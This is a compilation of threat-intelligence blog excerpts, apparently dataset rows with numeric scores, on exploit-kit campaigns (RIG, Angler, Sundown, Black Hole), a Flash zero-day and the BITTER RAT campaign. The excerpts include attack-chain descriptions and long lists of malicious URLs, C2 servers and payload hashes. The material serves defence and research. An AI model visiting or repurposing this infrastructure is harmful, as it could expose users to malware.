To mitigate these attacks, always make sure that your operating system is up-to-date as well as all the browsers and their respective plugins.
Of course, there will always be Zero-Days that make this recommendation useless, which is why exploit protection is more and more crucial.
@jeromesegura
",0.01367709981532872
"A look into some RIG exploit kit campaigns
In the past few weeks we’ve talked about the Neutrino and Magnitude exploit kits. This time, we take a look at RIG EK and in particular at various distribution channels and payloads.
Like most exploit kits, RIG relies on compromised sites and malvertising as its source of traffic but is one of the less sophisticated EKs due to its use of older exploits. For instance, its Flash exploit (CVE-2015-8651) was patched in late December 2015 whereas other EKs are using a more recent Flash exploit from May 2016 (CVE-2016-4117).",0.014036127085198968
"RIG EK exploiting Flash 20.0.0.228 (CVE-2015-8651)
Despite a less potent engine, RIG EK still generates a fair amount of traffic via several malware campaigns. The redirection mechanism from compromised site or malvertising to RIG EK is either done server side (302 redirects) or client side (iframe, JavaScript).
Different malware campaigns may represent different customers of the exploit kit (which can explain the various malware payloads), or the same individual diversifying his operations for redundancy purposes. One surprise with the samples we collected below is the absence of ransomware, a payload that is usually very prevalent with other exploit kits. Instead, we see bots and stealers that are thoroughly packed and obfuscated.
Campaigns overview:",0.012976214570810884
"The naming convention here is very basic as we picked some string or pattern that was unique for each campaign and used it as a label to differentiate it from others. As a note, there are probably additional variants, and other gates we have not documented here.
302 redirect",0.012035218214507482
"The 302 redirect path, as its name indicates it, uses server side 302 redirection to RIG EK’s landing page. For the most part, these are hacked sites that still load their content and perform the redirect.
Payload:",0.010206666829486455
"0289ab23c01b2ccb9f347035b5fca1bf8a607bc511dfbe52df8881c6482a4723
Neurevt Bot (Betabot)
Unpacked: malwr
Neurevt info",0.010168913482364816
gonext,0.009129454141808435
"This is one of the most active campaigns easily recognizable by the use of redirectors from certain TLDs, such as .top, and HTML files largely obfuscated with naming patterns such as lobo.phtml. The ultimate redirect to RIG relies on a 302, from a fairly static domain name (i.e. artisticplaces.net).
Payload:",0.01284034453786198
"c5184a30a88c234d3031c7661e0383114b54078448d62ae6fb51a4455863d4b5
Dofoil (Smoke Loader)
Unpacked: malwr
Smoke Loader info
C&C: prince-of-persia24.ru
Downloads: payload (IRC bot, C&C: med-global-fox.com)",0.011970904341379596
randphp,0.008112150234918403
"This distribution path is also very popular and leverages compromised sites injected with JavaScript that redirects to an intermediary site using a randomly named php file that contains an iframe to RIG EK.
Payload:",0.00694607603000974
"1a3e2f940db24ff23c40adfd45d053036bad7372699c904c1ef0aaae81b24c5d
Packed with VB packer, crashes",0.009306851332121058
trk,0.008233111353991407
"This campaign is based on malvertising that uses a two level redirection: a spammy/dummy site and a tracker which logs stats via a Google Analytics account and redirects to RIG EK via iframe.
Payload:",0.007925139223812994
"09f7926969f1dd11b828e2a3537c923646389140b2dba64c0b623b58099f3b64
Gootkit
Unpacked: malwr",0.009186525654378164
vollumne,0.008324162170749383
"This is yet another malvertising based campaign that funnels all traffic via vollumne.com, a domain registered to gianafyn410@yahoo.com (Russia). It uses a simple 302 redirect (server side) mechanism to RIG EK.
Payload:",0.013861659081898292
"fe128f8bc1be6a0076dd78133ae69029374e25b2662aaafdeb846af1bc60b617
Packed with VB packer, crashes",0.009235331611001096
Custom redirector,0.007549991851392379
"This attack path appears to use hacked or bogus domains stuffed with other content (porn, viagra, other ads). It may also be linked via malvertising and the redirection mechanism to RIG EK happens thanks to an iframe tag injected at the bottom of the home page.
Payload:",0.01601159494685711
"bb863da684e0b4a1940f0150a560745b6907c14ff295d93f73e5075adb28f3ea
Backdoor – turns off Windows Security Center
Automated analysis: malwr",0.0065995338919044855
IPredir,0.007960944155706029
"This is another easily recognizable attack with a custom redirector (i.e. casinoplayerall.online) and a redirect to a hardcoded IP address (i.e. 131.72.136.46) performing the final redirection to RIG EK.
Payload:",0.010385372398206472
"f21a7b90a83c482948206060d6637dffafc97ef319c9d7fa82f07cd9e8a7ec56
Gootkit
Unpacked: (intermediate payload) -> dropper_dll_service.dll",0.01023851631361683
IPredirvariant,0.0074925486435931665
"More recently we started seeing this redirect mechanism. These campaigns are malvertising driven, and lead to a harcoded IP address owned by threat actors.
Payload:",0.010442213769183972
"a1985dd74238996ab137b21f1856a5787ce07c8cd09744a260aaf1310d4a8944
Packed with VB packer, crashes",0.008939314956070366
Malshadow,0.008819673867175748
"Malvertising based attack path with the use of domain shadowing as the redirector to RIG EK.
Payload:",0.007449298034140628
"b91dd7571f191224ea8802bb9c9d153857b4f5d48eb72b811620268e8c954a00
Gootkit
Unpacked: dropper_dll_service.dll",0.009742795588043474
"Conclusion
The demise of Nuclear EK and the mysterious disappearance of Angler EK, by far two of the more sophisticated exploit kits to date, has lead to a new playing field where even smaller actors get increased exposure. Neutrino took the first spot and is used for high profile attacks via malvertising and a number of popular gates via hacked sites.
We continue to see RIG EK in malvertising attacks with low quality traffic and the tried and tested hacked sites distribution path, which all in all is very similar to Magnitude EK, except for the latter having an advantage with a better Flash exploit.
Malwarebytes Anti-Exploit customers continue to be protected against the RIG exploit kit.
Special thanks to @hasherezade for help with payload analysis!
IOCs:
Payloads (SHA256 dump)
gonext",0.015298127186771038
"artisticplaces[.]net/lobo.phtml?gonext=true&r=
biomasspelletplant2[.]xyz/lobo.html
biomasspelletplant3[.]xyz/lobo.html
biomasspelletplant4[.]xyz/lobo.html
biomasspelletplant5[.]xyz/lobo.html
biomasspelletplant6[.]xyz/lobo.html
biomasspelletplant7[.]top/lobo.html
biomasspelletplant[.]xyz/lobo.html
24x7apple[.]com/sp1.phtml?gonext=
affordableaffairsbyyoli[.]com/spm.phtml?gonext=
analyticsonjs[.]com/analytics.phtml?gonext=
balkanlight[.]com/bro.phtml?gonext=
blockmycalls[.]com/sm.phtml?gonext=
buzzinarea[.]com/immo.phtml?gonext=
capemadefieldguide.org/dan.phtml?gonext=
capemadefieldguide.org/ram.phtml?gonext=
clothes2017.club/oly.phtml?gonext=
cookingschoolonline.us/bro.phtml?gonext=
dadadeo[.]com/jes.phtml?gonext=
easyastrologyoraclecards[.]com/bruno.phtml?gonext=
ebldf[.]com/bruno.phtml?gonext=
enkorepartners[.]com/bruno.phtml?gonext=
gstatistics[.]com/stat.phtml?gonext=
henrymountjoy[.]com/sm.phtml?gonext=
littlebungas[.]com/myst.phtml?gonext=
mikeandangelina[.]com/myst.phtml?gonext=
molodinoska[.]com/bro.phtml?gonext=
monmariemakeupartist[.]com/sp1.phtml?gonext=
monsterbungas[.]com/myst2.phtml?gonext=
religiousapproaches[.]com/ch.phtml?gonext=
religiouslandscape[.]com/ch2.phtml?gonext=
siliconvalleydreams[.]com/oly.phtml?gonext=
snovels[.]com/myst.phtml?gonext=
svdreams[.]com/oly.phtml?gonext=
tequilabuch[.]com/bro.phtml?gonext=
thebookoneducation[.]com/bro.phtml?gonext=
thebookoneducation[.]com/laze2.phtml?gonext=
thebookoneducation[.]com/laze.phtml?gonext=
thebookoneducation[.]com/may.phtml?gonext=
thecasinobank[.]com/buggy.phtml?gonext=
wordpresscache.org/bro.phtml?gonext=
wordpresscache.org/youshynec.phtml?gonext=
youthadvocatecoaching[.]com/shi.phtml?gonext=",0.024837388375572145
randphp,0.008112150234918403
"103rdcomposite[.]net/forums/db/g3hbzckj.php?id=8548176
az.mediancard[.]com/8xrvwbkd.php?id=8141864
bitina[.]com/wqjkt8m2.php?id=12866788
e-bannerstand[.]com/nycy2z8t.php?id=11726031
ekitab[.]net/7thwcbvz.php?id=11741674
fh380968.bget[.]ru/templates/stets1/hhwbwny9.php
filosofia.top/j6fn3dfl.php?id=8294815
forum.wloclawek[.]pl/dmzxkcbr.php?id=14338552
gaptaquara[.]com.br/gkxpdffh.php?id=8231629
gv-pk[.]com/bfnmvvlw.php?id=7912878
illirico18[.]it/v98vrpz6.php?id=8247670
jobroom.nichost[.]ru/zpgrkljm.php?id=10810290
kromespb[.]ru/_VTI_CNF/rpwbr3gt.php?id=8519025
louisiana-indonesia[.]com/qc8nf2nc.php?id=8324784
multiporn[.]us/milfs/rzhxpbr8.php?id=1266474
ocenem1.nichost[.]ru/ndpvy6rk.php?id=10810290
russianbiker.de/4hyrb3fk.php?id=8062768
shop.universalauto[.]ru/x6m2byg8.php?id=8295668
tobiasdesigns[.]com/ckjvgphz.php?id=8426416
ugasac[.]com/webapp/sigemave/3cdnvtkn.php?id=8186035
waterjet-cutter[.]com/lc6jxqkv.php?id=15783431
www.bma[.]com.ua/vk63ntzy.php?id=2259041
www.hima-haven[.]com/rmbwj7ld.php?id=8118993
www.nspiredsigns[.]com/pfmj94vq.php?id=15876656
www.rospravo[.]ru/k67cpfnn.php?id=8673574",0.021721776060067532
IPredir,0.007960944155706029
"131.72.136.46/css/style.php
185.86.77.27/css/style.php
84.200.84.230/css/style.php",0.017950740016971056
IPredirvariant,0.0074925486435931665
91.218.114.24/html/index.php?voluumdata,0.00924574683215662
Malshadow,0.008819673867175748
"ads.adwirknetwork.com
",0.008580195658249079
Popular Site Leads To Angler EK & CVE-2015-8651 Flash Player Exploit,0.011371053208071413
"Forcepoint Security Labs™ identified this week that a well known transport company's website had been compromised.  We discovered that it was redirecting users to Angler Exploit Kit (EK).  Forcepoint informed the company who were quick to respond and address the issue. Users browsing to the site were exposed to malware being silently dropped onto their system and executed in the background. When we analyzed the infection we saw that users were being redirected to Angler EK which was then exploiting CVE-2015-8651, affecting Adobe Flash Player versions up to 20.0.0.228 and 20.0.0.235.",0.011822215997625785
Compromised Website,0.009962110070377728
"The website in question belongs to a transport company that is very popular in Europe, whose name we have redacted due to us assisting with on-going investigations. The website uses Joomla, which is no stranger to vulnerabilities and attacks in the wild, but we do not know whether the website was compromised due to an attack on their Joomla installation or not.",0.009181475413237328
fig 1. Injected code on compromised website,0.007840110401111988
"The code injected into the website in this instance was a very large piece of obfuscated code, a snippet of which can be seen in fig 1. The intention of the code was to redirect users to an exploit kit known as Angler EK, and we see this type of code injected into hundreds of websites on a daily basis. The actors behind the code sometimes redirect users to Neutrino EK for a few days as they did at the beginning of January, but they almost always lead to Angler.",0.012011240082710484
fig 2. Angler EK activity in January,0.014269679053687923
"The infection chain was as follows, simplified to only show the significant requests in the chain:",0.00803824243219009
Compromised site: hxxp://www.**redacted**.com/de/,0.011822618850009348
--> Angler EK landing page: hxxp://fbendservent-gratulabitur.brotherhoodmc[.]org/boards/index.php?,0.013101608472418813
--> Angler EK Flash Exploit (CVE-2015-8651): hxxp://fbendservent-gratulabitur.brotherhoodmc[.]org/similar.jsf?,0.01062771859408218
--> Angler EK CryptoWall 4.0 payload: hxxp://fbendservent-gratulabitur.brotherhoodmc[.]org/former.xhtm?,0.01320751616728999
--> CryptoWall 4.0 command-and-control: hxxp://yardstickglobal[.]in/Y37Jux.php?,0.0111268876313102
Flash Player Exploit - CVE-2015-8651,0.012393125278974737
fig 3. Angler EK requesting a SWF exploit,0.009252448457268247
"The Adobe Flash Player exploit used in this attack managed to leverage a very recent vulnerability, CVE-2015-8651 which Kafeine recently wrote about on his blog. We managed to de-compile the exploit that we were given by Angler EK, and identified the routine that triggers the vulnerability:",0.010420814686729507
fig 4. Angler EK's CVE-2015-8651 exploit trigger,0.008483330425496871
"Antiy Labs wrote a nice blog on how CVE-2015-8651 works, which is essentially an integer overflow vulnerability.",0.011176426144158258
"Angler EK is currently the only commercial exploit kit that is leveraging this vulnerability, while other EKs such as Neutrino, Nuclear and RIG are using exploits for older Flash vulnerabilities. Flash Player versions up to and including 20.0.0.228 and 20.0.0.235 are affected by CVE-2015-8651. Adobe patched the vulnerability from version 20.0.0.270 onwards.",0.01845907064428043
The SHA1 of the sample we encountered is 918efa4d30ad6018c7b7c7a66d701a3d122dfeac and we have also uploaded the unpacked SWF to VirusTotal for other researchers to analyze.,0.01647180880330934
CryptoWall 4.0,0.008032855593006927
"In the infection chain that we analyzed, the CryptoWall 4.0 ransomware was downloaded and executed on our machine. We will not go into any details about CryptoWall 4.0 in this blog, which has been thoroughly documented in recent months.",0.01327830091297455
The command-and-control proxy servers that we obtained from the CryptoWall sample (6af2aa305bc7da913ece5a5c98b214f3dae63738) are listed below:,0.014049182178203723
"hxxp://premierdisneyvilla.com/QXeHOy.php
hxxp://thebeautythesis.com/UaEigq.php
hxxp://wallpapersau.net/igrHKY.php
hxxp://neoad.de/NXy1mb.php
hxxp://jlprotect.ca/_poxuV.php
hxxp://dunwoodypress.com/DJHMXS.php
hxxp://zolty.eu/bnFKET.php
hxxp://behejbrno.com/MixtUZ.php
hxxp://campaignforyoungamerica.org/LT3YRB.php
hxxp://pc.all-to-all.com/Ryfq7Y.php
hxxp://apexminerals.com.au/k8HqvL.php
hxxp://macphoto.nl/7NBUqj.php
hxxp://acie.edu.np/DFQvsZ.php
hxxp://international.woptimo.com/YglxHK.php
hxxp://t-firma-en.itech-websolutions.com/U2Ac7i.php
hxxp://artistblip.com/QJ9HzW.php
hxxp://villisplace.info/fJQ_3v.php
hxxp://jogos.testeqi.com.br/4t1E7X.php
hxxp://telecom-sa.com/azRXqt.php
hxxp://dolphinworld.org/MaB54K.php
hxxp://yardstickglobal.in/Y37Jux.php
hxxp://noahwilbanks.com/PtXsO_.php
hxxp://kskillsmobility.eu/ludO0_.php
hxxp://liberal.com.mx/0My2EZ.php
hxxp://itt-pushkino.org/D2BE6m.php
hxxp://avazuinc.com/D04m5N.php
hxxp://empiredigitalmarketing.com/09LihY.php
hxxp://apptitudes.fr/eC2F1f.php
hxxp://ifawindow.co.uk/0w5MVI.php
hxxp://calsalumni.iastate.edu.staging.sites.flyinghippo.com/ScXajM.php
hxxp://grafitti-photo.com/IGHOYq.php
hxxp://bem-bakery.com/HPINRS.php
hxxp://dentiste-paris-20.fr/IhfweE.php
hxxp://daddysground.cz/zTVoGb.php
hxxp://hatha.it/6tnLEG.php
hxxp://bulksmsdealer.com/vR3BEX.php
hxxp://mangohills.net/RxIoCE.php
hxxp://aspectdesigns.com.au/0rTVlG.php
hxxp://acmm.org.au/idjFbx.php
hxxp://emotionwerbung.de/389Tak.php
hxxp://indonesiandomains.com/e9vsxj.php
hxxp://myteaminspired.com/mzTOIv.php
hxxp://monicasalvador.com.ar/btWiaQ.php
hxxp://turbosol.asia/l7xydO.php
hxxp://hand-made.by/rQWftY.php
hxxp://conseils-finance.com/kJsnUb.php
hxxp://stevesyachtrepair.com/S8bJFl.php
hxxp://morainecare.com/eQRvWp.php
hxxp://taftee.in/JnGQ1s.php
hxxp://larosa.com.au/8beYcC.php
hxxp://itvsoft.asia/rRwKxj.php
hxxp://jameswbos.com/v10aAJ.php
hxxp://giaohang.org/lCs_PE.php
hxxp://thebesttshirtsonline.com/CF9iM8.php
hxxp://vancouverdispensarycoalition.ca/euqUb5.php
hxxp://muel.altervista.org/z1ho2W.php
hxxp://edlenimaging.com/be5AmR.php
hxxp://goldenangels.com.tr/l4Fw8D.php
hxxp://uzmankirala.com/KhVRbv.php
hxxp://igotocd.com/rklVaO.php
hxxp://dining-bar.com/BQ_Ln4.php
hxxp://jadwalpialadunia.in/rG4Rdi.php
hxxp://en.theolympiaschools.edu.vn/FCfXeB.php
hxxp://ihadthat.com/1NEnbi.php
hxxp://directoryassistanceamerica.com/XeBUDN.php
hxxp://australianmotorinns.com/9ctKlH.php
hxxp://event-travel.co.uk/3K6Psd.php
hxxp://london-escorts-agency.org.uk/fdnmyD.php
hxxp://vinastudio.at/8TkXUJ.php
hxxp://jjcampbell.com/1wK5Iy.php",0.020798912279092696
Customer Protection,0.009782250766576905
Forecepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:,0.006455238075894765
Stage 2 (Lure) - The malicious Javascript on the compromised website is detected and blocked.,0.012261757619156044
Stage 4 (Exploit Kit) - The Angler EK pages are identified and prevented from exploiting the user's browser.,0.014752961108905116
Stage 6 (Backchannel Traffic) - Attempts by the CryptoWall 4.0 malware to contact its command-and-control server are detected and blocked in real-time.,0.013703793792467334
Observations - An Attack on One is an Attack on All,0.011762333923668877
"What is interesting to note is that the compromised site in question is the 'front door' to one of the services provided by a major European company.  Within the company portfolio are services in the areas of airlines, car hire, mass transit, Internet and even hotel and lettings.  As with similar organizations, these services are integrated at the marketing and customer communications level.  Receiving an email from the group on say mass transit will include references and links to their other services.  In this particular case, one of our researchers subsequently identified the compromised site linked from a booking confirmation email for a different group member service.  This illustrates two considerations:",0.0119568831136313
That it only takes one weak link to allow those with malicious intent to potentially 'reach out' to the whole of the corporate customer base and,0.009121482727053709
"When building customer messaging material, extra rigor should be considered when including links to other services both to external services but especially those 'in-house'. Don't just be careful what you click on, be careful what you link to.",0.014011854907868937
Summary,0.009602684635656611
"Angler EK continues to be one of the biggest threats to individuals and organizations around the globe. The adoption of one of the newest vulnerabilities in Adobe Flash Player, in conjunction with compromising high profile websites, guarantees that the criminals behind Angler EK have a large surface area of potential victims. It is important to keep up to date with software updates, especially for Adobe Flash Player which is often the weapon of choice for malware actors when it comes to finding vulnerabilities.
",0.014558201316728914
"by Dancho Danchev
As part of its quarterly patch update, today Adobe issued a critical security update plugging multiple security holes in its Acrobat Reader, and Adobe Acrobat software applications.
More details:",0.017973591854438586
"The security bulletin is patching the following vulnerabilities CVE-2011-2462, CVE-2011-4369, CVE-2011-4370, CVE-2011-4371, CVE-2011-4372, CVE-2011-4373, allowing remote code execution attacks.
These updates address critical vulnerabilities in Adobe Reader X (10.1.1) and earlier versions for Windows and Macintosh, and Adobe Acrobat X (10.1.1) and earlier versions for Windows and Macintosh. These vulnerabilities could cause the application to crash and potentially allow an attacker to take control of the affected system. These updates include fixes for CVE-2011-2462 and CVE-2011-4369, previously addressed in Adobe Reader and Acrobat 9.x for Windows as referenced in Security Bulletin APSB11-30.
Affected software versions:",0.010783702880970303
"Adobe Reader X (10.1.1) and earlier 10.x versions for Windows and Macintosh
Adobe Reader 9.4.7 and earlier 9.x versions for Windows
Adobe Reader 9.4.6 and earlier 9.x versions for Macintosh
Adobe Acrobat X (10.1.1) and earlier 10.x versions for Windows and Macintosh
Adobe Acrobat 9.4.7 and earlier 9.x versions for Windows
Adobe Acrobat 9.4.6 and earlier 9.x versions for Macintosh",0.020462232439688255
"Adobe vulnerabilities are just the tip of the iceberg, when it comes to the malicious exploitation of client-side vulnerabilities. Contrary to the common belief that zero day vulnerabilities are the primary growth factor of the cybercrime ecosystem, numerous independent reports confirm that patched vulnerabilities are the primary exploitation vector for a cybercriminal’s malicious campaign.
Users are advised to ensure that they’re not running any outdated software, next to browser plugins.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011520569047413165
Common Malware Initiative,0.009498674454765599
"Posted by Roger on 22 September 2005, 10:26 am",0.01247289524780304
"The long talked about Common Malware Enumeration initiative is set to get off the ground next month. It will be run by the Mitre Corporation (who also currently runs the CVE database). The purpose of this database is to make it easier for the media to hype up virus incidents and help buttruss the stock of antivirus companies.
It just gets so confusing when you don’t know whose bagel.ac is someone else’s bagel.af. And this will solve all our problems. Yeah right.
While I am all for a more understandable virus incident report at the end of the month, does this really improve security? Personally, I just want the viruses stopped. I don’t care what you call it. Perhaps that is the innovation antivirus companies should be focusing on.
edit – posting this from firefox. apparently the version I’m running doesn’t have a spellchecker like Internet Explorer. I need to upgrade my Firefox. Its really vulnerable. I hear the later versions of Firefox should have a spell checker in it. So pardon the misspellings. I’ll try to get back later and run a spell check.
",0.016246109319489332
"Over the past 24 hours, cybercriminals started spamvertising millions of emails impersonating the United Parcel Service (UPS) in an attempt to trick end and corporate users into previewing a malicious .html attachment. Upon previewing it, a tiny iFrame attempts to contact a client-side exploits serving a landing URL, courtesy of the Black Hole web malware exploitation kit.
More details:",0.010920413013586705
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample client-side exploits serving URL: hxxp://mskoblastionline.ru:8080/forum/showthread.php?page=5fa58bce769e5c2c
Sample exploits served: CVE-2010-0188; CVE-2010-1885
Upon successful client-side exploitation, the campaign drops MD5: 7fe4d2e52b6f3f22b2f168e8384a757e – detected by 28 out of 42 antivirus scanners as Worm:Win32/Cridex.E; Trojan.Win32.Buzus.lxwt
mskoblastionline.ru – 50.56.92.47; 190.120.228.92; 203.80.16.81
Name servers part of the campaign’s infrastructure:
ns1.mskoblastionline.ru – 85.143.166.186
ns2.mskoblastionline.ru – 203.172.140.202
ns3.mskoblastionline.ru – 87.120.41.155
ns4.mskoblastionline.ru – 173.224.208.60
ns5.mskoblastionline.ru – 132.248.49.112
Responding to these IPs are also the following malicious command and control servers:
penelopochka.ru
sergikgorec.ru
kolmykiaonline.ru
mskoblastionline.ru
panalki.ru
anapoli.ru
flumifrator2unix.ru
We’ve already seen these domains and IPs used in previously profiled campaigns such as the “Spamvertised ‘Fwd: Scan from a Hewlett-Packard ScanJet’ emails lead to Black Hole exploit kit“, and the “Cybercriminals impersonate Intuit Market, mass mail millions of exploits and malware serving emails” campaign.
This isn’t the first time we’ve profiled malicious campaigns impersonating the United Parcel Service. Consider going through related posts profiling the dynamics of related campaigns:",0.010408282402126767
"Cybercriminals impersonate UPS in client-side exploits and malware serving spam campaign
Spamvertised ‘UPS Delivery Notification’ emails serving client-side exploits and malware
Spamvertised ‘Your UPS delivery tracking’ emails serving client-side exploits and malware",0.012176251576541786
"Webroot SecureAnywhere users are proactively protected from this threat.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010140397009949953
"Yet another Sundown EK variant? (updated)
Update (11/6/2016): TrendLabs recently published (11/04/2016) their own research on this new Sundown EK, which turns out to be a new exploit kit (‘Bizarro SunDown EK’), based on the same code as the former. It was brought to my attention that they actually discovered it long before, and it was reflected in an Emerging Threats ruleset update dated 2016/10/07.
The exploit kit scene today pales in comparison to what it was over a year ago and indeed, after Nuclear and Angler, Neutrino also appears to have vanished. This is why when we spot something different in the wild, we immediately think it’s going to be that new contender that leads the pack.
Right after I posted on the changes to the Sundown exploit kit, I got pinged on Twitter by @edx about yet another possible variant of that EK which had a landing URL stripped of any parameters. I recalled also seeing such a thing and wasn’t sure immediately what it was. In the meantime, Brad Duncan from MalwareTraffic also blogged about this new variant detected as Sundown EK by the Emerging Threats ruleset.
This post looks at one particular distribution method and compares the exploit landing code of this possible new variant with previous versions of Sundown EK.
Compromised site and Openx ad server
The infection chain starts with a compromised site that was injected with a link to a hacked OpenX ad server. The rest is pretty classic as it involves fast changing shadowed domains that generate the iframe to the exploit kit landing page.",0.013364459194977751
"Landing page déjà-vu
Some parts of the landing page had a striking feel of Sundown EK, in particular the Flash exploit call. Below are different landing pages taken from several variants of Sundown EK and the newer version, which all have matching CLSID and width/height params.",0.01162150242154314
This is a side by side comparison between the Sundown EK we blogged about recently and the newest landing (click for bigger picture). Note: this is a VBScript exploit (CVE-2016-0189) stolen from RIG EK and a pattern of Sundown EK of reusing other EK’s code. Thanks to the person who left a comment about this.,0.012104572582416262
New variant overview,0.00822892790391927
"Payload
In this particular case, we received the Locky ransomware as a payload.",0.016417262214185713
Historical overview,0.010217244706900885
"This may not be the latest and greatest exploit kit we were expecting, indeed the Flash exploit(s) are not new and overall we could call it a lite version of Sundown. However, it shows that there is active development and tweaks happening behind the scenes and that is worthy of a mention.
As always, thanks to other researchers for their input and sharing exploit kit intelligence.
Update (10/19/2106): Thanks @Ledtech3 for mentionning the tree decision for Flash player exploit. (added to IOCs other SWF that targets newer Flash versions, i.e. 21.0.0.213)
IOCs",0.012055105350990192
"Landing page: Link
Flash exploit (gjorijfjds.swf -> targets older versions) f1016d736929c2cbd9265b2d975a4bf8593aafa6c1af5318bef8329b3f869bf6
Flash exploit (gjdksls.swf -> targets newer versions) e36933b2e2a4b83b70eedd37ef86e3945dff1e639deff932b460c13dd88269ec
Payload (Locky) 04e3cce4775868fcfb497de27979ea077623d0bc9707f86efd86ab0136227d3a
",0.01100897160369363
Installshield Updates,0.01016661033920685
"Posted by Roger on 22 November 2008, 2:55 pm",0.012938188358312952
"The vulnerability scan has been reporting vulnerabilities in the Installshield Update Service. This update service is bundled by some third party products. The first several times I looked at how to patch this all I could find was documents saying to wait for the original application that bundled Installshield Updater to update. That obviously wasn’t acceptable. At that time I didn’t even know which application put this on the system.
The first vulnerability was Macrovision InstallShield Update Service Multiple Insecure Methods. CVE 2007-5660. The vulnerability here was in the ActiveX control of the update service (isusweb.dll). I deployed ActiveX kill bits as a preventative measure, but I kept looking for a patch.
Next there was a vulnerability in InstallShield Flexnet Connect ActiveX. CVE-2008-2470.
I was able to look at the computers reporting the vulnerability and I found in most cases a database.ini file that indicated the GUID of the software package to be updated by Flexnet Connect. It appeared to be Roxio CD/DVD burning software cerca 2006.
More searching revealed that Roxio has published a KB for this here with a link to a security update.
I tested out the update and it looks like with a /v”/qb” switch I can deploy this pretty easily.
",0.01289977968962408
"Adobe Flash Player Zero-Day: details and mitigation
Update (02/24/14): This exploit has been found in the wild already. It is blocked by Malwarebytes Anti-Exploit.",0.013230514908609159
"In a very busy month for vulnerabilities and only days after the Internet Explorer zero-day went public, a new vulnerability in Adobe’s Flash Player has been identified.
Security firm FireEye revealed all the details in a blog post today, saying this had been a targeted attack affecting a number of non-profit and research organisations.
Thankfully, the vulnerability which has been assigned CVE-2014-0502, has already been addressed by Adobe in a security advisory posted today.
The following versions and operating systems are affected:",0.009841842076878327
"Adobe Flash Player 12.0.0.44 and earlier versions for Windows and Macintosh
Adobe Flash Player 11.2.202.336 and earlier versions for Linux
Adobe AIR 4.0.0.1390 and earlier versions for Android",0.01254207301175414
"In order to bypass Address Space Layout Randomization (ASLR) protection in Windows, this attack relied on either one of the following configurations:",0.010778265138802534
"Windows XP
Windows 7 and Java 1.6
Windows 7 and outdated Microsoft Office 2007/2010",0.011247081964570582
"Users who did not fall into any of these categories would have been safe (although the vulnerability still existed in the Flash Player) showing the importance of keeping a system up-to-date.
In case you are not sure which version of the Flash Player your system is running, you can download the latest version (Version 12.0.0.70) from Adobe’s own site here.
While all these zero-days have mainly been aimed at a small number of people in very targeted attacks, it is not good news for mainstream users. With an abundance of exploit code available, malware authors now have even more weapons to use in their toolkit.
Basic security measures such as keeping your computer up-to-date, running antivirus and anti-malware solutions go a long way but still leave a small window open for zero-day attacks. Exploit mitigation software such as Microsoft’s EMET or our own Malwarebytes Anti-Exploit aim at closing that gap.
@jeromesegura
",0.012938641062419931
BITTER: a targeted attack against Pakistan,0.009900046113878513
Introduction,0.012036720276026314
"Forcepoint Security Labs™ recently encountered a strain of attacks that appear to target Pakistani nationals. We named the attack ""BITTER"" based on the network communication header used by the latest variant of remote access tool (RAT) used:",0.016840683860483985
Our investigation indicates that the campaign has existed since at least November 2013 but has remained active until today. This post intends to share the results of our research.,0.014124725936833893
Infection Vector,0.007707828833425245
"Spear-phishing emails are used to target prospective BITTER victims. The campaign predominantly used the older, relatively popular Microsoft Office exploit, CVE-2012-0158, in order to download and execute a RAT binary from a website. Below is an example of a spear-phishing email they used earlier this month. The recipient is an individual from a government branch in Pakistan, while the sender purports to be coming from another government branch of Pakistan:",0.010633353133487677
Other attachment filenames they used that also contained the CVE-2012-0158 exploit are as follows:,0.009090773234043281
Requirement List.doc,0.008875399567641828
Cyber Espionage Prevention.doc,0.009134904128135557
New email guidelines.doc,0.009595675125870895
Gazala-ke-haseen-nagme.doc,0.009328799060781878
Rules.xls,0.00888607937275765
"In one instance, they used a RAR SFX dropper that drops both their RAT and a picture of a Pakistani woman as a decoy. A quick Google image search on the dropped picture indicates that the picture was grabbed from Pakistani dating sites.",0.01236700299325244
RAT Component,0.008028444837101634
BITTER used RATs that are compiled using Microsoft Visual C++ 8.0. They use a few iterations of their RAT with the main difference being the RAT's command and control (C2) communication method. Earlier variants communicated to its C2 via an unencrypted HTTP POST. Below is an example of an older variant's phone home request:,0.013823237991123727
"Newer ones, on the other hand, use encrypted TCP connection such as the one shown in the introduction above. Both older and newer variants are used simultaneously today in the campaign.",0.013295654677436763
"The RAT version (SHA1 d7a770233848f42c5e1d5f4b88472f7cb12d5f3d) that they used in their latest campaign is capable of executing the following backdoor capabilities, essentially allowing the attackers to gain full remote control over a victim's PC:",0.012846083974558553
"Get system information - computer name, current user name, and operating system",0.011987222054826496
Enumerate logical drives,0.007225694337389843
Enumerate and log files and their corresponding timestamps,0.009540875617590427
Open a remote command shell,0.006325181967720805
List processes with active UDP connections,0.009444704783272306
Manipulate running processes,0.008645626980823162
Manipulate files,0.008444407720738512
Download a file,0.007921519167629842
"In addition, the vast majority of their RAT binaries contained the following digital signature with a non-trusted CA Root certificate:",0.014197728953437516
"The following table shows the timeline of appearance of BITTER RATs, based on their compilation timestamps, along with their embedded PDB paths:",0.018937745781113513
It is important to note that some of these RATs are distributed at a later time than their compilation date.,0.014064115116880771
Command and Control,0.007602465590859198
"BITTER used free dynamic DNS (DDNS) and dedicated server hosting services in order to set up their C2s. The download site where the exploit documents download the RAT binaries are, in most cases, different from the actual RAT C2. However, both of them are typically registered using a Gmail email address and a spoofed identity purporting to be either from United Kingdom or Great Britain. Below is an example of a spoofed registrant information for the C2, spiralbook71[.]com:",0.013782498383923758
A list of all related malicious domains we managed to collect are as follows:,0.010484540691318212
"The email address witribehelp@gmail.com​ points to an empty Google Plus profile with the name ""WhatsApp Support"". Interestingly, however, the account is connected to another Google Plus account with the handle ""Love Pakistan"":",0.014293885162169673
Intent,0.009096668725074086
"While cyber-espionage is a common motivation for targeted attacks, this is often hard to conclude unless a forensic investigation is conducted on the actual victims' machines. In some cases, specific capabilities in RATs provides us with clues on what the attackers' true intents are.",0.013473006823865097
"One of the backdoor capabilities mentioned above is the logging of files and files' time stamps from the victim's machine. Furthermore, an older variant of their RAT from 2014 that has the SHA1 3ab4ce4b3a44c96d6c454efcece774b33335dda2 are found to look for more specific file types. After identifying the logical drives from a victim PC, this RAT variant proceeds to enumerate files and check if they match any of the hard coded document and archive file extensions below:",0.012997315705514878
